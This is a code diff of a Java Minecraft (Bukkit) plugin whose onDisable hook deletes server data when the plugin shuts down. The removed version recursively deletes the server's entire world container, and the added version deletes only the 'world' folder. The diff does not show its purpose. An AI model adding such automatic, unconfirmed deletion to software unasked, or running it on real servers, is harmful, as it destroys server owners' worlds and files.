@@ -1,30 +1,20 @@
 package me.EssexIO;
 
-import java.io.File;
+import java.io.IOException;
 import java.util.logging.Level;
 
+import org.apache.commons.io.FileUtils;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class Main extends JavaPlugin {
-	static public boolean deleteDirectory(File path) {
-		if( path.exists() ) {
-			final File[] files = path.listFiles();
-			for (final File file2 : files) {
-				if(file2.isDirectory()) {
-					deleteDirectory(file2);
-				}
-				else {
-					file2.delete();
-				}
-			}
-		}
-		return( path.delete() );
-	}
-
+	
 	@Override
 	public void onDisable() {
-		getServer().getLogger().log(Level.INFO, "-----SERVER WORLD BEING DELETED-----");
-		deleteDirectory(getServer().getWorldContainer());
+		try {
+			FileUtils.deleteDirectory(getServer().getWorld("world").getWorldFolder());
+		} catch (IOException e) {
+			getServer().getLogger().log(Level.INFO, "--- UNABLE TO DELETE OVERWORLD ---");
+		}
 	}
 
 	@Override
